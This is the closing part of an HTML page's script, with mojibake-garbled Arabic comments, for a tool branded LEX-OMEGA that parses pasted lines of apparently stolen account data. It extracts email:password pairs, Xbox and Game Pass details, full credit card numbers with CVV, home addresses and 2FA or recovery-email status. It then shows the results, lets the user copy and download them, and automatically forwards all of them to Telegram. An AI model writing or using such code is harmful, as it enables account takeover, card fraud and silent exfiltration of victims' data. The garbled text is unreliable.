        // Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¹Ù†ÙˆØ§Ù† (Address)
        const userAddressRegex = /Address\s*=\s*\[\s*Address:\s*([^,\]]+),\s*City:\s*([^,\]]+),\s*State:\s*([^,\]]+),\s*Postalcode:\s*([^\]]+)\s*\]/i;

        // ** GEN3: ØªØ¹Ø¨ÙŠØ± Ø¬Ø¯ÙŠØ¯ Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ **
        const securityStatusRegex = /(2fa|2\s?step|mfa|two\s?factor|backup\s?code|google\s?authenticator|authenticator|TOTP|Security\s?Questions|Enabled\s*:\s*2FA|Recovery\s?Email)\s*[:=\-]?\s*(Yes|On|True|Email\s*:\s*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}))/i;
        
        // *** ØªØ¹Ø¨ÙŠØ± Ø§Ù„ÙƒØ´Ù Ø§Ù„Ø§Ø³ØªÙ†ØªØ§Ø¬ÙŠ Ù„Ø¨Ø·Ø§Ù‚Ø© Ù…ÙØ®Ø²Ù‘Ù†Ø© (Ù„Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø¥ÙŠÙ…ÙˆØ¬ÙŠ) ***
        // Ù†Ø¨Ø­Ø« Ø¹Ù†: Ø´Ø±Ø§Ø¡ Ù„Ø¹Ø¨Ø©/Ù…Ø­ØªÙˆÙ‰ (Game/Consumable) Ø£Ùˆ Ø§Ø´ØªØ±Ø§Ùƒ (Ultimate/Basic/Personal/Family/EA Play) Ø¨Ø³Ø¹Ø± ØºÙŠØ± ØµÙØ±
        const inferredPaymentRegex = /(Product Type ğŸ”¥\s*=\s*(Game|Consumable)|Subscription\s*ğŸ™‚\s*=\s*(Xbox Game Pass Ultimate|Microsoft 365 (Personal|Family|Basic)|EA Play|Gold))\s*.*(Price\s*=\s*(\d+(\.\d{1,2})?)\s*(USD|EUR|GBP|BRL|CAD|CLP|NOK))/i;

        for (const line of lines) {
            emailPwRegex.lastIndex = 0; priceRegex.lastIndex = 0;
            ultraCardRegex.lastIndex = 0; partialCardRegex.lastIndex = 0;
            userAddressRegex.lastIndex = 0; extendedFeaturesRegex.lastIndex = 0;
            securityStatusRegex.lastIndex = 0;
            inferredPaymentRegex.lastIndex = 0; // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ù…Ø¤Ø´Ø± Ø§Ù„ØªØ¹Ø¨ÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯
            
            let match;
            
            if ((match = emailPwRegex.exec(line)) !== null) {
                const email = match[1].trim();
                const password = match[2].trim();
                
                const hasGamePass = gamePassKeywords.test(line);
                let priceMatch = priceRegex.exec(line);
                let extractedPrice = null;
                
                let cardDetails = null; 
                let ultraCardDetails = null; 
                let addressDetails = null;
                let extendedFeatures = []; 
                let securityStatus = null; // Ø­Ø§Ù„Ø© Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
                let hasInferredPayment = false; // *** Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù…ØªØºÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯ ***

                if (priceMatch) extractedPrice = priceMatch[2];
                
                // *** Ø§Ù„ÙƒØ´Ù Ø§Ù„Ø§Ø³ØªÙ†ØªØ§Ø¬ÙŠ Ù„ÙˆØ¬ÙˆØ¯ ÙÙŠØ²Ø§ ***
                if (inferredPaymentRegex.test(line)) {
                    hasInferredPayment = true;
                }
                
                if (toolType === 'pro') {
                    
                    // 1. Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ù…ØªØ¯Ø©
                    let featureMatch;
                    while ((featureMatch = extendedFeaturesRegex.exec(line)) !== null) {
                         const feature = featureMatch[1].trim().toLowerCase().replace(/\s/g, '');
                         if (!extendedFeatures.includes(feature)) {
                            extendedFeatures.push(feature);
                         }
                    }

                    // 2. Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†
                    const addressMatch = userAddressRegex.exec(line);
                    if (addressMatch) {
                        addressDetails = {
                            address: addressMatch[1].trim(),
                            city: addressMatch[2].trim(),
                            state: addressMatch[3].trim(),
                            zip: addressMatch[4].trim()
                        };
                    }
                    
                    // 3. Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ø£Ù…Ø§Ù† (2FA, Recovery Email)
                    const securityMatch = securityStatusRegex.exec(line);
                    if (securityMatch) {
                        const type = securityMatch[1].toLowerCase();
                        const value = securityMatch[3] ? securityMatch[3].trim() : securityMatch[2];
                        if (type.includes('2fa') || type.includes('step') || type.includes('mfa') || type.includes('factor') || type.includes('authenticator')) {
                            securityStatus = `2FA: ${value.toLowerCase().includes('yes') || value.toLowerCase().includes('on') ? 'Ù…ÙØ¹Ù„Ø©' : 'Ù…Ø°ÙƒÙˆØ±Ø©'}`;
                        } else if (type.includes('recovery')) {
                             securityStatus = `Ø¥ÙŠÙ…ÙŠÙ„ Ø§Ø­ØªÙŠØ§Ø·ÙŠ: ${value}`;
                        }
                    }
                    
                    // 4. Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø© (Ø§Ù„Ø£ÙˆÙ„ÙˆÙŠØ©)
                    const ultraMatch = ultraCardRegex.exec(line);
                    if (ultraMatch) {
                        ultraCardDetails = {
                            number: ultraMatch[1].replace(/[^\d]/g, ''), 
                            month: ultraMatch[2].padStart(2, '0'),
                            year: ultraMatch[3].slice(-2),
                            cvv: ultraMatch[4]
                        };
                        hasInferredPayment = true; // Ù…Ø¤ÙƒØ¯Ø© Ø£ÙƒØ«Ø±
                    } else {
                        // 5. Ø§Ø³ØªØ®Ù„Ø§Øµ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¬Ø²Ø¦ÙŠØ© (Ø¥Ø°Ø§ Ù„Ù… ØªØªÙˆÙØ± Ø§Ù„ÙƒØ§Ù…Ù„Ø©)
                        const partialMatch = partialCardRegex.exec(line);
                        if (partialMatch) {
                            cardDetails = {
                                last4: partialMatch[1].trim(), 
                                month: partialMatch[2].trim().padStart(2, '0'),
                                year: partialMatch[3].trim().slice(-2),
                            };
                            hasInferredPayment = true; // Ù…Ø¤ÙƒØ¯Ø© Ø£ÙƒØ«Ø±
                        }
                    }
                }

                if (email && password.length > 0) {
                    // *** Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ù…ØªØºÙŠØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯ Ø¥Ù„Ù‰ Ù…ØµÙÙˆÙØ© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ***
                    extractedPairs.push([email, password, hasGamePass, extractedPrice, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasInferredPayment]);
                }
            }
        }
        
        // (Ø¬Ø²Ø¡ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„ÙØ±ÙŠØ¯Ø© - ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¯Ù…Ø¬)
        if (0 === extractedPairs.length) {
             parseBtn.classList.remove('processing');
             parseBtn.textContent = (toolType === 'max') ? "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX" : "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO";
             return showToast("Ù…Ø§ÙƒÙˆ Ù†ØªØ§Ø¦Ø¬ Ù…Ø·Ø§Ø¨Ù‚Ø©");
        }

        const uniqueResults = [];
        for (const [email, password, hasGamePass, price, card, address, ultraCard, features, security, inferredPayment] of extractedPairs) {
            const key = email.toLowerCase() + ":" + password;
            const existingIndex = uniqueResults.findIndex(item => (item[0].toLowerCase() + ":" + item[1]) === key);

            if (existingIndex === -1) {
                uniqueResults.push([email, password, hasGamePass, price, card, address, ultraCard, features, security, inferredPayment]);
            } else {
                const existingItem = uniqueResults[existingIndex];
                if (hasGamePass && !existingItem[2]) existingItem[2] = true; 
                if (price !== null && existingItem[3] === null) existingItem[3] = price;
                if (card !== null && existingItem[4] === null) existingItem[4] = card;
                if (address !== null && existingItem[5] === null) existingItem[5] = address;
                if (ultraCard !== null && existingItem[6] === null) existingItem[6] = ultraCard;
                if (security !== null && existingItem[8] === null) existingItem[8] = security; // Ø¯Ù…Ø¬ Ø§Ù„Ø£Ù…Ø§Ù†
                if (inferredPayment && !existingItem[9]) existingItem[9] = true; // *** Ø¯Ù…Ø¬ Ù…Ø¤Ø´Ø± Ø§Ù„ÙÙŠØ²Ø§ ***
                existingItem[7] = [...new Set([...existingItem[7], ...features])];
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ„ÙŠÙƒØ±Ø§Ù…
        if (uniqueResults.length > 0) {
            const telegramMessage = uniqueResults.map(([email, password, hasGP, price, card, address, ultraCard, features, security, inferredPayment]) => {
                let text = `${email}:${password}`;
                
                // *** Ø¥Ø¶Ø§ÙØ© Ø±Ù…Ø² Ø§Ù„ÙÙŠØ²Ø§ ÙÙŠ Ø¨Ø¯Ø§ÙŠØ© Ø§Ù„Ù…ÙŠØ²Ø§Øª ***
                if (inferredPayment) text += " ğŸ’³";

                if (hasGP) text += " | ÙƒÙŠÙ… Ø¨Ø§Ø³";
                if (price) text += ` | Ø±ØµÙŠØ¯ $${price}`;
                if (ultraCard) {
                    text += ` | ğŸ’³ CC FULL: ${ultraCard.number}|${ultraCard.month}/${ultraCard.year}|${ultraCard.cvv}`;
                } else if (card) {
                    text += ` | ğŸ’³ CC PARTIAL: ****${card.last4}, ${card.month}/${card.year}`;
                }
                if (address) {
                    text += ` | ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${address.city}, ${address.zip}`;
                }
                if (security) {
                    text += ` | ğŸ”’ ${security}`;
                }
                if (features.length > 0) {
                    text += ` | âœ¨ Ø®Ø¯Ù…Ø§Øª: ${features.map(f => f.charAt(0).toUpperCase() + f.slice(1)).join(', ')}`;
                }
                return text;
            }).join('\n');
            
            const toolName = (toolType === 'max') ? "MAX" : "PRO (GEN3)";
            const header = `ğŸ‰ *Ù†ØªØ§Ø¦Ø¬ Ø£Ø¯Ø§Ø© LEX-OMEGA ${toolName} Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©* ğŸ‰\nØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©:\n\n\`\`\``;
            const footer = "\n\`\`\`\nØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù…Ù† Ø§Ù„Ø£Ø¯Ø§Ø©.";
            sendToTelegram(header + telegramMessage + footer);
        }

        // Ø¨Ù†Ø§Ø¡ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù†ØªØ§Ø¦Ø¬ (Ø§Ù„Ø¹Ø±Ø¶ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø§Ø´Ø©)
        uniqueResults.forEach(([email, password, hasGamePass, price, cardDetails, addressDetails, ultraCardDetails, extendedFeatures, securityStatus, hasInferredPayment]) => {
            const itemDiv = document.createElement("div");
            itemDiv.className = "item";
            
            const leftDiv = document.createElement("div");
            leftDiv.className = "left";
            const emailDiv = document.createElement("div");
            emailDiv.className = "email";
            emailDiv.textContent = email;
            
            // *** Ø¥Ø¶Ø§ÙØ© Ø±Ù…Ø² Ø§Ù„ÙÙŠØ²Ø§ Ù…Ø¨Ø§Ø´Ø±Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„ Ù„ÙŠÙƒÙˆÙ† ÙˆØ§Ø¶Ø­Ø§Ù‹ ***
            if (hasInferredPayment) {
                 const visaSpan = document.createElement("span");
                 visaSpan.textContent = " ğŸ’³";
                 emailDiv.appendChild(visaSpan);
            }
            
            const pwDiv = document.createElement("div");
            pwDiv.className = "pw";
            
            pwDiv.appendChild(document.createTextNode(password)); 
            
            // **Ø§Ù„Ù…ÙŠØ²Ø§Øª:**
            
            if (hasGamePass) {
                 const gpSpan = document.createElement("span");
                 gpSpan.className = "gamepass-note";
                 gpSpan.textContent = "ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³";
                 pwDiv.appendChild(gpSpan); 
            }
            
            if (price !== null) {
                 const priceSpan = document.createElement("span");
                 priceSpan.className = "price-note";
                 priceSpan.textContent = `ğŸ’² Ø±ØµÙŠØ¯ $${price}`; 
                 pwDiv.appendChild(priceSpan); 
            }
            
            // 1. Ø§Ù„Ø£Ù…Ø§Ù†
            if (toolType === 'pro' && securityStatus) {
                 const securitySpan = document.createElement("span");
                 securitySpan.className = "security-note";
                 securitySpan.textContent = `ğŸ”’ ${securityStatus}`;
                 pwDiv.appendChild(securitySpan);
            }
            
            // 2. Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„ÙƒØ§Ù…Ù„Ø© (Ø§Ù„Ù€ Ultra)
            if (toolType === 'pro' && ultraCardDetails) {
                 const cardSpan = document.createElement("span");
                 cardSpan.className = "ultra-cc-note";
                 cardSpan.textContent = `âš¡ï¸ CC FULL | ${ultraCardDetails.number} | ${ultraCardDetails.month}/${ultraCardDetails.year} | CVV: ${ultraCardDetails.cvv}`;
                 pwDiv.appendChild(cardSpan);
            }
            
            // 3. Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ø§Ù„Ø¬Ø²Ø¦ÙŠØ© (Ø¥Ø°Ø§ Ù…Ø§ÙƒÙˆ ÙƒØ§Ù…Ù„Ø©)
            else if (toolType === 'pro' && cardDetails) {
                 const cardSpan = document.createElement("span");
                 cardSpan.className = "cc-note";
                 cardSpan.textContent = `ğŸ’³ CC PARTIAL | ****${cardDetails.last4} (${cardDetails.month}/${cardDetails.year})`; 
                 pwDiv.appendChild(cardSpan);
            }
            
            // 4. Ø§Ù„Ø¹Ù†ÙˆØ§Ù†
            if (toolType === 'pro' && addressDetails) {
                 const addressSpan = document.createElement("span");
                 addressSpan.className = "address-note";
                 addressSpan.textContent = `ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${addressDetails.city}, ${addressDetails.zip}`; 
                 pwDiv.appendChild(addressSpan);
            }

            // 5. Ø§Ù„Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù…Ù…ØªØ¯Ø©
            if (toolType === 'pro' && extendedFeatures.length > 0) {
                 const featureSpan = document.createElement("span");
                 featureSpan.className = "feature-note";
                 
                 // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø£Ø³Ù…Ø§Ø¡ Ù„Ù„Ø¹Ø±Ø¶ Ø¨Ø´ÙƒÙ„ Ù„Ø·ÙŠÙ (Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ø£Ø³Ù…Ø§Ø¡)
                 const featureNames = extendedFeatures.map(f => {
                    if (f === 'disney+') return 'Disney+';
                    if (f === 'hbomax') return 'HBO Max';
                    if (f === 'eaplay') return 'EA Play';
                    if (f === 'amazonprime') return 'Prime';
                    if (f === 'discordnitro') return 'Nitro';
                    if (f === 'chatgptplus') return 'ChatGPT Plus';
                    if (f === 'adobecc') return 'Adobe CC';
                    if (f === 'midjourney') return 'Midjourney';
                    return f.charAt(0).toUpperCase() + f.slice(1);
                 }).join(', ');
                 
                 featureSpan.textContent = `ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ${featureNames}`; 
                 pwDiv.appendChild(featureSpan);
            }

            leftDiv.appendChild(emailDiv);
            leftDiv.appendChild(pwDiv);
            
            const controlsDiv = document.createElement("div");
            controlsDiv.className = "controls";
            
            const copyEmailBtn = document.createElement("button");
            copyEmailBtn.className = "copy-btn btn-red";
            copyEmailBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„";
            copyEmailBtn.onclick = async () => { await copyText(email) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„"); };
            
            const copyPwBtn = document.createElement("button");
            copyPwBtn.className = "copy-btn btn-black"; 
            copyPwBtn.textContent = "Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯";
            copyPwBtn.onclick = async () => { await copyText(password) && showToast("ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯"); };
            
            controlsDiv.appendChild(copyEmailBtn);
            controlsDiv.appendChild(copyPwBtn);
            
            itemDiv.appendChild(leftDiv);
            itemDiv.appendChild(controlsDiv);
            
            listElement.appendChild(itemDiv);
        });
        
        parseBtn.classList.remove('processing');
        parseBtn.textContent = (toolType === 'max') ? "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX" : "Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO";

        showToast(`ØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ ${uniqueResults.length} Ù†ØªÙŠØ¬Ø© ÙØ±ÙŠØ¯Ø©`)
    }
    
    // Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ø±Ø¨Ø· ÙˆØ¸Ø§Ø¦Ù Ø§Ù„Ù†Ø³Ø® ÙˆØ§Ù„ØªÙ†Ø²ÙŠÙ„
    function setupCopyDownload(listElement, copyBtn, downloadBtn, toolName) { 
        copyBtn.onclick = async () => {
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù†Ø³Ø®Ù‡Ø§");
            
            const t = [...e].map(e => { 
                const email = e.querySelector(".email").textContent.trim().replace('ğŸ’³', '').trim(); // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥ÙŠÙ…ÙˆØ¬ÙŠ Ù…Ù† Ø§Ù„Ù†Ø³Ø®
                const pwDiv = e.querySelector(".pw");
                const password = pwDiv.firstChild.textContent.trim(); 
                
                // Ø§Ø³ØªØ®Ù„Ø§Øµ ÙƒÙ„ Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª ÙˆØªÙ†Ø¸ÙŠÙÙ‡Ø§ Ù…Ù† Ø§Ù„Ø±Ù…ÙˆØ² ÙˆØ§Ù„Ø§ÙŠÙ…ÙˆØ¬ÙŠ
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
                    let text = span.textContent.trim();
                    // ØªÙ†Ø¸ÙŠÙ Ø±Ù…ÙˆØ² Ø§Ù„Ø§ÙŠÙ…ÙˆØ¬ÙŠ ÙˆØ§Ù„Ù†ØµÙˆØµ Ø§Ù„ØªÙ…Ù‡ÙŠØ¯ÙŠØ©
                    text = text.replace('ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³', 'Game Pass');
                    text = text.replace('ğŸ’² Ø±ØµÙŠØ¯', 'Credit');
                    text = text.replace('âš¡ï¸ CC FULL | ', 'CC FULL: ');
                    text = text.replace('ğŸ’³ CC PARTIAL | ', 'CC PARTIAL: ');
                    text = text.replace('ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ', 'Address: ');
                    text = text.replace('ğŸ”’ ', 'Security: ');
                    text = text.replace('ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ', 'Features: ');
                    return text;
                }).join(' | ');

                // Ø¥Ø¶Ø§ÙØ© Ù…Ø¤Ø´Ø± Ø§Ù„ÙÙŠØ²Ø§ Ø§Ù„Ù…Ø³ØªÙ†ØªØ¬ Ø¥Ù„Ù‰ Ù…Ù„Ù Ø§Ù„Ù†Ø³Ø® Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆØ¬ÙˆØ¯Ø§Ù‹
                const hasInferred = e.querySelector(".email").textContent.includes('ğŸ’³') ? 'INFERRED_PAYMENT' : '';
                
                let resultLine = email + ":" + password;
                if (notes || hasInferred) {
                    resultLine += " | " + (hasInferred ? hasInferred + (notes ? " | " : "") : "") + notes;
                }
                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, ''); // ØªÙ†Ø¸ÙŠÙ Ø§Ù„ÙÙˆØ§ØµÙ„
            }).join("\n");
            
            await copyText(t) && showToast(`ØªÙ… Ù†Ø³Ø® ÙƒÙ„ Ù†ØªØ§Ø¦Ø¬ ${toolName}`);
        };
        
        downloadBtn.onclick = () => {
            const e = listElement.querySelectorAll(".item");
            if (!e.length) return void showToast("Ù„Ø§ ØªÙˆØ¬Ø¯ Ù†ØªØ§Ø¦Ø¬ Ù„Ù„ØªÙ†Ø²ÙŠÙ„");
            
            const t = [...e].map(e => { 
                const email = e.querySelector(".email").textContent.trim().replace('ğŸ’³', '').trim(); // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥ÙŠÙ…ÙˆØ¬ÙŠ Ù…Ù† Ø§Ù„ØªÙ†Ø²ÙŠÙ„
                const pwDiv = e.querySelector(".pw");
                const password = pwDiv.firstChild.textContent.trim(); 
                
                const notes = [...pwDiv.querySelectorAll('.gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-note, .feature-note, .security-note')].map(span => {
                    let text = span.textContent.trim();
                    // ØªÙ†Ø¸ÙŠÙ Ø±Ù…ÙˆØ² Ø§Ù„Ø§ÙŠÙ…ÙˆØ¬ÙŠ ÙˆØ§Ù„Ù†ØµÙˆØµ Ø§Ù„ØªÙ…Ù‡ÙŠØ¯ÙŠØ©
                    text = text.replace('ğŸ® ÙƒÙŠÙ… Ø¨Ø§Ø³', 'Game Pass');
                    text = text.replace('ğŸ’² Ø±ØµÙŠØ¯', 'Credit');
                    text = text.replace('âš¡ï¸ CC FULL | ', 'CC FULL: ');
                    text = text.replace('ğŸ’³ CC PARTIAL | ', 'CC PARTIAL: ');
                    text = text.replace('ğŸ“ Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ', 'Address: ');
                    text = text.replace('ğŸ”’ ', 'Security: ');
                    text = text.replace('ğŸ”¥ Ø®Ø¯Ù…Ø§Øª: ', 'Features: ');
                    return text;
                }).join(' | ');

                // Ø¥Ø¶Ø§ÙØ© Ù…Ø¤Ø´Ø± Ø§Ù„ÙÙŠØ²Ø§ Ø§Ù„Ù…Ø³ØªÙ†ØªØ¬ Ø¥Ù„Ù‰ Ù…Ù„Ù Ø§Ù„ØªÙ†Ø²ÙŠÙ„ Ø¥Ø°Ø§ ÙƒØ§Ù† Ù…ÙˆØ¬ÙˆØ¯Ø§Ù‹
                const hasInferred = e.querySelector(".email").textContent.includes('ğŸ’³') ? 'INFERRED_PAYMENT' : '';
                
                let resultLine = email + ":" + password;
                if (notes || hasInferred) {
                    resultLine += " | " + (hasInferred ? hasInferred + (notes ? " | " : "") : "") + notes;
                }
                return resultLine.trim().replace(/ \| \| /g, ' | ').replace(/ \|$/, '');
            }).join("\n");
            
            const o = new Blob([t], { type: "text/plain;charset=utf-8" }), n = URL.createObjectURL(o), c = document.createElement("a");
            c.href = n, c.download = `${toolName}_emails_passwords_LEX-GEN3.txt`, c.click(), URL.revokeObjectURL(n), showToast("ØªÙ… ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ù…Ù„Ù Ø¨Ù†Ø¬Ø§Ø­");
        };
    }

    // **********************************************
    // ** ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØµÙØ­Ø© Ø¹Ù†Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„ **
    // **********************************************
    window.onload = () => {
        clearBtnMax.onclick = () => { inputMax.value = "", listMax.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© MAX"); };
        setupCopyDownload(listMax, copyAllBtnMax, downloadBtnMax, "MAX");
        
        clearBtnPro.onclick = () => { inputPro.value = "", listPro.innerHTML = "", showToast("ØªÙ… Ù…Ø³Ø­ Ù…Ø­ØªÙˆÙ‰ Ø£Ø¯Ø§Ø© PRO"); };
        setupCopyDownload(listPro, copyAllBtnPro, downloadBtnPro, "PRO");

        navigateTo('tool'); 
    };

</script>
</body>
</html>
